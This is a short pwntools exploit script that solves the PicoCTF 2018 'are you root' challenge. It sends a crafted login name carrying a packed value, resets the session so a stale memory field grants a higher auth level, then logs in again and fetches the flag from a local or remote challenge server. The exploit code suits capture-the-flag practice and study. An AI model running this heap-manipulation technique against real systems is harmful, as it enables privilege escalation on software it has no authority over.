#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./PicoCTF_2018_are_you_root')
	elf = ELF('./PicoCTF_2018_are_you_root',checksec=False)

else:
	p = remote('node3.buuoj.cn',28635)
	elf = ELF('./PicoCTF_2018_are_you_root',checksec=False)

def menu(cmd):
    sla("Enter your command:",cmd)


menu('login AAAAAAAA'+p64(0x5))
menu('set-auth 4')

menu('reset')
menu('login Railgun')
menu('get-flag')

ia()